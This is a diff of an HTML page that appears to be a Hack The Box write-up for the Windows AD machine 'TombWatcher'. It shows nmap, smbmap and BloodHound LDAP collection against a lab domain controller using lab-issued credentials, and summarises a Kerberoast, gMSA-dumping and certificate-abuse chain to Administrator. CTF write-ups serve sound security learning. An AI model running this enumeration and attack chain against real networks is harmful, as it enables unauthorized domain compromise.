@@ -3,353 +3,72 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Hack The Box :: TombWatcher Writeup — Hackthekat</title>
   <meta name="description" content="HTB TombWatcher machine writeup by Hackthekat">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet" type="text/css">
   <link rel="stylesheet" href="/main.css">
   <link rel="icon" type="image/png" href="/favicon.ico">
   <style>
-    /* ===== HTB WRITEUP PAGE ===== */
-    :root {
-      --htb-green: #9fef00;
-      --htb-green-soft: rgba(159,239,0,0.1);
-      --htb-bg: #0a0e14;
-      --htb-card: #11161d;
-      --htb-card-hover: #161c24;
-      --htb-border: #1f2832;
-      --htb-text: #c9d1d9;
-      --htb-muted: #6b7785;
-      --htb-easy: #9fef00;
-      --htb-medium: #ffaf00;
-      --htb-hard: #ff3838;
-      --htb-insane: #b372ff;
-      --htb-code-bg: #0d1117;
-    }
-
+    :root { --htb-green: #9fef00; --htb-bg: #0a0e14; --htb-card: #11161d; --htb-card-hover: #161c24; --htb-border: #1f2832; --htb-text: #c9d1d9; --htb-muted: #6b7785; --htb-easy: #9fef00; --htb-medium: #ffaf00; --htb-hard: #ff3838; --htb-insane: #b372ff; --htb-code-bg: #0d1117; }
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      background: var(--htb-bg);
-      color: var(--htb-text);
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-      font-size: 16px;
-      line-height: 1.7;
-      min-height: 100vh;
-    }
-
+    body { background: var(--htb-bg); color: var(--htb-text); font-family: 'Inter','Segoe UI', system-ui, sans-serif; font-size: 16px; line-height: 1.7; min-height: 100vh; }
     a { color: var(--htb-green); text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* ===== TOP NAV ===== */
-    .writeup-nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      background: rgba(10,14,20,0.95);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--htb-border);
-      padding: 0.9rem 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-    .writeup-nav .logo {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 1.05rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-    }
+    code { font-family: 'Monaco','Menlo',monospace; font-size: 0.88em; color: var(--htb-green); background: rgba(159,239,0,0.08); padding: 0.1em 0.35em; border-radius: 3px; }
+    .writeup-nav { position: sticky; top: 0; z-index: 100; background: rgba(10,14,20,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--htb-border); padding: 0.9rem 2rem; display: flex; align-items: center; gap: 1rem; }
+    .writeup-nav .logo { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 1.05rem; font-weight: 700; letter-spacing: 1px; }
     .writeup-nav .logo span { color: #fff; }
     .nav-sep { color: var(--htb-muted); margin: 0 0.2rem; }
     .nav-breadcrumb { color: var(--htb-muted); font-size: 0.9rem; }
     .nav-breadcrumb a { color: var(--htb-muted); }
     .nav-breadcrumb a:hover { color: var(--htb-green); }
-
-    /* ===== HERO ===== */
-    .writeup-hero {
-      position: relative;
-      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%),
-                  linear-gradient(180deg, #0a0e14 0%, #0a0e14 100%);
-      padding: 4.5rem 2rem 3.5rem;
-      border-bottom: 1px solid var(--htb-border);
-      overflow: hidden;
-    }
-    .writeup-hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-      -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-    }
-    .writeup-hero-inner {
-      position: relative;
-      z-index: 1;
-      max-width: 860px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .writeup-hero-prompt {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 0.9rem;
-      margin-bottom: 1.2rem;
-      opacity: 0.8;
-    }
+    .writeup-hero { position: relative; background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%); padding: 4.5rem 2rem 3.5rem; border-bottom: 1px solid var(--htb-border); overflow: hidden; }
+    .writeup-hero::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); }
+    .writeup-hero-inner { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; text-align: center; }
+    .writeup-hero-prompt { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 0.9rem; margin-bottom: 1.2rem; opacity: 0.8; }
     .writeup-hero-prompt::before { content: '> '; }
-    .writeup-hero h1 {
-      font-size: 3.5rem;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -1.5px;
-      line-height: 1.1;
-      margin-bottom: 1.2rem;
-    }
+    .writeup-hero h1 { font-size: 3.5rem; font-weight: 700; color: #fff; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 1.2rem; }
     .writeup-hero h1 .accent { color: var(--htb-green); }
-    .writeup-badges {
-      display: flex;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-    .htb-badge {
-      font-size: 0.72rem;
-      padding: 0.25rem 0.75rem;
-      border-radius: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      font-family: 'Monaco','Menlo',monospace;
-    }
+    .writeup-badges { display: flex; justify-content: center; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .htb-badge { font-size: 0.72rem; padding: 0.25rem 0.75rem; border-radius: 4px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; font-family: 'Monaco','Menlo',monospace; }
     .os-linux { background: rgba(159,239,0,0.12); color: var(--htb-green); border: 1px solid rgba(159,239,0,0.35); }
     .os-windows { background: rgba(0,153,255,0.12); color: #0099ff; border: 1px solid rgba(0,153,255,0.35); }
     .diff-easy { background: rgba(159,239,0,0.12); color: var(--htb-easy); border: 1px solid rgba(159,239,0,0.35); }
     .diff-medium { background: rgba(255,175,0,0.12); color: var(--htb-medium); border: 1px solid rgba(255,175,0,0.35); }
     .diff-hard { background: rgba(255,56,56,0.12); color: var(--htb-hard); border: 1px solid rgba(255,56,56,0.35); }
     .diff-insane { background: rgba(179,114,255,0.12); color: var(--htb-insane); border: 1px solid rgba(179,114,255,0.35); }
-    .writeup-hero-tagline {
-      color: var(--htb-muted);
-      font-size: 0.95rem;
-      font-family: 'Monaco','Menlo',monospace;
-    }
-
-    /* ===== LAYOUT ===== */
-    .writeup-layout {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 3rem 2rem 5rem;
-    }
-
-    /* ===== CONTENT TYPOGRAPHY ===== */
-    .writeup-body p {
-      color: var(--htb-text);
-      margin: 1rem 0;
-      line-height: 1.75;
-    }
-    .writeup-body h2.writeup-section-title {
-      font-size: 1.75rem;
-      font-weight: 700;
-      color: #fff;
-      margin: 3rem 0 1rem;
-      padding-bottom: 0.6rem;
-      border-bottom: 1px solid var(--htb-border);
-      letter-spacing: -0.3px;
-    }
-    .writeup-body h2.writeup-section-title::before {
-      content: '# ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 1.1rem;
-    }
-    .writeup-body h3.writeup-sub-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #e6edf3;
-      margin: 2rem 0 0.75rem;
-    }
-    .writeup-body h3.writeup-sub-title::before {
-      content: '## ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.85rem;
-      opacity: 0.7;
-    }
-    .writeup-body h4.writeup-step-title {
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--htb-green);
-      margin: 1.5rem 0 0.5rem;
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 0.3px;
-    }
+    .writeup-hero-tagline { color: var(--htb-muted); font-size: 0.95rem; font-family: 'Monaco','Menlo',monospace; }
+    .writeup-layout { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    .writeup-body p { color: var(--htb-text); margin: 1rem 0; line-height: 1.75; }
+    .writeup-body h2.writeup-section-title { font-size: 1.75rem; font-weight: 700; color: #fff; margin: 3rem 0 1rem; padding-bottom: 0.6rem; border-bottom: 1px solid var(--htb-border); letter-spacing: -0.3px; }
+    .writeup-body h2.writeup-section-title::before { content: '# '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 1.1rem; }
+    .writeup-body h3.writeup-sub-title { font-size: 1.2rem; font-weight: 600; color: #e6edf3; margin: 2rem 0 0.75rem; }
+    .writeup-body h3.writeup-sub-title::before { content: '## '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 0.85rem; opacity: 0.7; }
+    .writeup-body h4.writeup-step-title { font-size: 1rem; font-weight: 600; color: var(--htb-green); margin: 1.5rem 0 0.5rem; font-family: 'Monaco','Menlo',monospace; letter-spacing: 0.3px; }
     .writeup-body h4.writeup-step-title::before { content: '→ '; opacity: 0.7; }
-
-    /* ===== CODE BLOCKS ===== */
-    .code-block {
-      background: var(--htb-code-bg);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      overflow: hidden;
-      position: relative;
-    }
-    .code-block::before {
-      content: '';
-      display: block;
-      height: 3px;
-      background: linear-gradient(90deg, var(--htb-green), transparent);
-    }
-    .code-block pre {
-      padding: 1.2rem 1.5rem;
-      overflow-x: auto;
-      margin: 0;
-    }
-    .code-block pre code {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      font-size: 0.82rem;
-      color: #e6edf3;
-      line-height: 1.6;
-      white-space: pre;
-    }
-
-    /* ===== SCREENSHOTS ===== */
-    .screenshot-wrap {
-      margin: 1.5rem 0;
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    .screenshot-wrap img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .img-caption {
-      display: block;
-      padding: 0.5rem 1rem;
-      font-size: 0.8rem;
-      color: var(--htb-muted);
-      font-style: italic;
-      border-top: 1px solid var(--htb-border);
-    }
-
-    /* ===== FLAG BOXES ===== */
-    .flag-box {
-      background: rgba(159,239,0,0.06);
-      border: 1px solid rgba(159,239,0,0.3);
-      border-left: 4px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1rem 1.5rem;
-      margin: 1.5rem 0;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    .flag-label {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      white-space: nowrap;
-    }
-    .flag-value {
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.8rem;
-      color: #e6edf3;
-      background: rgba(0,0,0,0.3);
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
-      word-break: break-all;
-    }
-
-    /* ===== ROOTED BOX ===== */
-    .rooted-box {
-      background: rgba(159,239,0,0.08);
-      border: 1px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1.2rem 1.5rem;
-      margin: 2rem 0;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 1px;
-    }
-
-    /* ===== INFO CARD (Machine Info) ===== */
-    .machine-info-card {
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 12px;
-      padding: 1.5rem 2rem;
-      margin: 0 0 2.5rem 0;
-    }
-    .machine-info-card table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .machine-info-card td {
-      padding: 0.4rem 1rem 0.4rem 0;
-      color: var(--htb-text);
-      font-size: 0.9rem;
-      vertical-align: top;
-    }
-    .machine-info-card td:first-child {
-      color: var(--htb-muted);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.82rem;
-      white-space: nowrap;
-      width: 130px;
-    }
-
-    /* ===== BACK BUTTON ===== */
-    .back-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: var(--htb-muted);
-      font-size: 0.9rem;
-      font-family: 'Monaco','Menlo',monospace;
-      margin-bottom: 2.5rem;
-      transition: color 0.2s;
-    }
+    .code-block { background: var(--htb-code-bg); border: 1px solid var(--htb-border); border-radius: 8px; margin: 1.2rem 0; overflow: hidden; position: relative; }
+    .code-block::before { content: ''; display: block; height: 3px; background: linear-gradient(90deg, var(--htb-green), transparent); }
+    .code-block pre { padding: 1.2rem 1.5rem; overflow-x: auto; margin: 0; }
+    .code-block pre code { font-family: 'Monaco','Menlo',monospace; font-size: 0.82rem; color: #e6edf3; line-height: 1.6; white-space: pre; background: none; padding: 0; }
+    .screenshot-wrap { margin: 1.5rem 0; background: var(--htb-card); border: 1px solid var(--htb-border); border-radius: 8px; overflow: hidden; }
+    .screenshot-wrap img { width: 100%; height: auto; display: block; }
+    .img-caption { display: block; padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--htb-muted); font-style: italic; border-top: 1px solid var(--htb-border); }
+    .flag-box { background: rgba(159,239,0,0.06); border: 1px solid rgba(159,239,0,0.3); border-left: 4px solid var(--htb-green); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .flag-label { font-size: 0.85rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; }
+    .flag-value { font-family: 'Monaco','Menlo',monospace; font-size: 0.8rem; color: #e6edf3; background: rgba(0,0,0,0.3); padding: 0.2rem 0.6rem; border-radius: 4px; word-break: break-all; }
+    .rooted-box { background: rgba(159,239,0,0.08); border: 1px solid var(--htb-green); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 2rem 0; text-align: center; font-size: 1.2rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; letter-spacing: 1px; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--htb-muted); font-size: 0.9rem; font-family: 'Monaco','Menlo',monospace; margin-bottom: 2.5rem; transition: color 0.2s; }
     .back-link:hover { color: var(--htb-green); text-decoration: none; }
-    .back-link::before { content: '←'; }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .writeup-hero h1 { font-size: 2.4rem; }
-      .writeup-layout { padding: 2rem 1.2rem 4rem; }
-      .writeup-nav { padding: 0.8rem 1.2rem; }
-    }
+    .back-link::before { content: '← '; }
+    @media (max-width: 768px) { .writeup-hero h1 { font-size: 2.4rem; } .writeup-layout { padding: 2rem 1.2rem 4rem; } .writeup-nav { padding: 0.8rem 1.2rem; } }
   </style>
 </head>
 <body>
-
-  <!-- Navigation -->
   <nav class="writeup-nav">
     <a href="/" class="logo">> <span>hackthekat</span></a>
     <span class="nav-sep">/</span>
-    <span class="nav-breadcrumb">
-      <a href="/writeups/">writeups</a>
-      <span class="nav-sep">/</span>
-      tombwatcher
-    </span>
+    <span class="nav-breadcrumb"><a href="/writeups/">writeups</a><span class="nav-sep">/</span>tombwatcher</span>
   </nav>
-
-  <!-- Hero -->
   <div class="writeup-hero">
     <div class="writeup-hero-inner">
       <div class="writeup-hero-prompt">hackthekat — writeup</div>
@@ -361,48 +80,34 @@
       <div class="writeup-hero-tagline">Penetration Testing Writeup</div>
     </div>
   </div>
-
-  <!-- Main Content -->
   <div class="writeup-layout">
-    <a href="/writeups/" class="back-link"> Back to all writeups</a>
-
+    <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
-      <div class="machine-info-card">
-        <table>
-          <tr><td>Machine</td><td><strong>TombWatcher</strong></td></tr>
-          <tr><td>Difficulty</td><td><span class="htb-badge diff-medium">Medium</span></td></tr>
-          <tr><td>OS</td><td><span class="htb-badge os-windows">Windows</span></td></tr>
-          <tr><td>Credentials</td><td><code style="font-size:0.85rem;color:var(--htb-green)">henry / H3nry_987TGV! Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address. nmap 10.129.244.237</code></td></tr>
-          <tr><td>Note</td><td style="color:var(--htb-muted);font-size:0.85rem">This is an assumed breach scenario — credentials are provided by HTB.</td></tr>
-        </table>
-      </div>
+      <h2 class="writeup-section-title">Machine Overview</h2>
+      <p>TombWatcher is a Medium difficulty Windows AD machine. Starting with provided credentials, the attack leverages <strong>WriteSPN</strong> rights for a Targeted Kerberoast, then chains through <strong>gMSA password dumping</strong>, <strong>WriteOwner abuse</strong>, and <strong>AD tombstone (deleted object) restoration</strong> to recover a deleted cert_admin account. The final escalation uses <strong>certipy</strong> to request a certificate as Administrator and obtain an LDAP shell.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250607193317.png" alt="Pasted image 20250607193317.png" loading="lazy" /><span class="img-caption">Pasted image 20250607193317.png</span></div>
-      <p>As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!</p>
       <h3 class="writeup-sub-title">Port Scanning</h3>
-      <h4 class="writeup-step-title">Full Port scan</h4>
-      <p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
-      <div class="code-block"><pre><code>nmap 10.129.244.237 
+      <p>I start with a full port scan. This is an assumed-breach scenario with credentials: <code>henry / H3nry_987TGV!</code>.</p>
+      <div class="code-block"><pre><code>nmap 10.129.244.237                                                                                        
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 04:56 CEST
 Nmap scan report for 10.129.244.237
 Host is up (0.017s latency).
 Not shown: 987 filtered tcp ports (no-response)
-PORT STATE SERVICE
-53/tcp open domain
-80/tcp open http
-88/tcp open kerberos-sec
-135/tcp open msrpc
-139/tcp open netbios-ssn
-389/tcp open ldap
-445/tcp open microsoft-ds
-464/tcp open kpasswd5
-593/tcp open http-rpc-epmap
-636/tcp open ldapssl
-3268/tcp open globalcatLDAP
-3269/tcp open globalcatLDAPssl
-5985/tcp open wsman</code></pre></div>
-      <h4 class="writeup-step-title">Detailed port scan</h4>
-      <p>At the detailed port scan go to get more information from the services which are open on the ip address.</p>
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  wsman</code></pre></div>
+      <p>A detailed service-version scan (<code>-sCV</code>) fingerprints the exact software versions running on each open port, helping identify potential vulnerabilities.</p>
       <div class="code-block"><pre><code>nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV 10.129.244.237 -vvvv
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 04:58 CEST
 NSE: Loaded 157 scripts for scanning.
@@ -456,18 +161,18 @@ Nmap scan report for 10.129.244.237
 Host is up, received echo-reply ttl 127 (0.017s latency).
 Scanned at 2025-06-08 04:58:12 CEST for 88s
 
-PORT STATE SERVICE REASON VERSION
-53/tcp open domain syn-ack ttl 127 Simple DNS Plus
-80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0
+PORT     STATE SERVICE       REASON          VERSION
+53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
+80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
 | http-methods: 
-| Supported Methods: OPTIONS TRACE GET HEAD POST
-|_ Potentially risky methods: TRACE
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
 |_http-title: IIS Windows Server
-88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-07 23:06:27Z)
-135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn
-389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
+88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-07 23:06:27Z)
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: commonName=DC01.tombwatcher.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
 | Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
@@ -475,17 +180,17 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha1WithRSAEncryption
 | Not valid before: 2024-11-16T00:47:59
-| Not valid after: 2025-11-16T00:47:59
-| MD5: a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
+| Not valid after:  2025-11-16T00:47:59
+| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
 | SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
 | -----BEGIN CERTIFICATE-----
 | //
 |_-----END CERTIFICATE-----
 |_ssl-date: 2025-06-07T23:07:58+00:00; -3h51m41s from scanner time.
-445/tcp open microsoft-ds? syn-ack ttl 127
-464/tcp open kpasswd5? syn-ack ttl 127
-593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-636/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+464/tcp  open  kpasswd5?     syn-ack ttl 127
+593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-06-07T23:07:59+00:00; -3h51m41s from scanner time.
 | ssl-cert: Subject: commonName=DC01.tombwatcher.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
@@ -494,13 +199,13 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha1WithRSAEncryption
 | Not valid before: 2024-11-16T00:47:59
-| Not valid after: 2025-11-16T00:47:59
-| MD5: a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
+| Not valid after:  2025-11-16T00:47:59
+| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
 | SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
 | -----BEGIN CERTIFICATE-----
 |//
 |_-----END CERTIFICATE-----
-3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
+3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
 |_ssl-date: 2025-06-07T23:07:58+00:00; -3h51m41s from scanner time.
 | ssl-cert: Subject: commonName=DC01.tombwatcher.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
@@ -509,13 +214,13 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha1WithRSAEncryption
 | Not valid before: 2024-11-16T00:47:59
-| Not valid after: 2025-11-16T00:47:59
-| MD5: a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
+| Not valid after:  2025-11-16T00:47:59
+| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
 | SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
 | -----BEGIN CERTIFICATE-----
 | //
 |_-----END CERTIFICATE-----
-3269/tcp open ssl/ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
+3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: commonName=DC01.tombwatcher.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
 | Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
@@ -523,58 +228,59 @@ PORT STATE SERVICE REASON VERSION
 | Public Key bits: 2048
 | Signature Algorithm: sha1WithRSAEncryption
 | Not valid before: 2024-11-16T00:47:59
-| Not valid after: 2025-11-16T00:47:59
-| MD5: a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
+| Not valid after:  2025-11-16T00:47:59
+| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
 | SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
 | -----BEGIN CERTIFICATE-----
 |//
 |_-----END CERTIFICATE-----
 |_ssl-date: 2025-06-07T23:07:59+00:00; -3h51m41s from scanner time.
-5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 | smb2-security-mode: 
-| 3:1:1: 
-|_ Message signing enabled and required
+|   3:1:1: 
+|_    Message signing enabled and required
 | smb2-time: 
-| date: 2025-06-07T23:07:14
-|_ start_date: N/A
+|   date: 2025-06-07T23:07:14
+|_  start_date: N/A
 |_clock-skew: mean: -3h51m42s, deviation: 2s, median: -3h51m41s
 | p2p-conficker: 
-| Checking for Conficker.C or higher...
-| Check 1 (port 24982/tcp): CLEAN (Timeout)
-| Check 2 (port 60267/tcp): CLEAN (Timeout)
-| Check 3 (port 57100/udp): CLEAN (Timeout)
-| Check 4 (port 18365/udp): CLEAN (Timeout)
-|_ 0/4 checks are positive: Host is CLEAN or ports are blocked
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 24982/tcp): CLEAN (Timeout)
+|   Check 2 (port 60267/tcp): CLEAN (Timeout)
+|   Check 3 (port 57100/udp): CLEAN (Timeout)
+|   Check 4 (port 18365/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
 
 
 Nmap done: 1 IP address (1 host up) scanned in 88.97 seconds
- Raw packets sent: 17 (724B) | Rcvd: 14 (600B)</code></pre></div>
-      <p>I first checked to see if there was anything interesting on the SMB server, but there is nothing there that we can exploit.</p>
-      <div class="code-block"><pre><code>smbmap -H tombwatcher.htb -u henry -p &#x27;H3nry_987TGV!&#x27; 
-[+] IP: 10.129.244.237:445 Name: tombwatcher.htb Status: Authenticated
- Disk Permissions Comment
- ---- ----------- -------
- ADMIN$ NO ACCESS Remote Admin
- C$ NO ACCESS Default share
- IPC$ READ ONLY Remote IPC
- NETLOGON READ ONLY Logon server share 
- SYSVOL READ ONLY Logon server share 
+           Raw packets sent: 17 (724B) | Rcvd: 14 (600B)</code></pre></div>
+      <p>SMB enumeration reveals no immediately exploitable shares.</p>
+      <div class="code-block"><pre><code>smbmap -H tombwatcher.htb -u henry -p &#x27;H3nry_987TGV!&#x27;                  
+[+] IP: 10.129.244.237:445      Name: tombwatcher.htb           Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
 [*] Closed 1 connections</code></pre></div>
-      <p>Since we already received user credentials from HTB, I immediately retrieved the data from the LDAP server. I will copy this to my HTB folder on my Kali machine and upload it to Bloodhound.</p>
+      <h3 class="writeup-sub-title">BloodHound Analysis</h3>
+      <p>I collect LDAP data and analyze it in BloodHound. The user <code>henry</code> has <strong>WriteSPN</strong> rights over user <code>Alfred</code> — enabling a Targeted Kerberoast attack.</p>
       <div class="code-block"><pre><code>nxc ldap 10.129.244.237 -u &#x27;henry&#x27; -p &#x27;H3nry_987TGV!&#x27; --bloodhound --collection All --dns-server 10.129.244.237
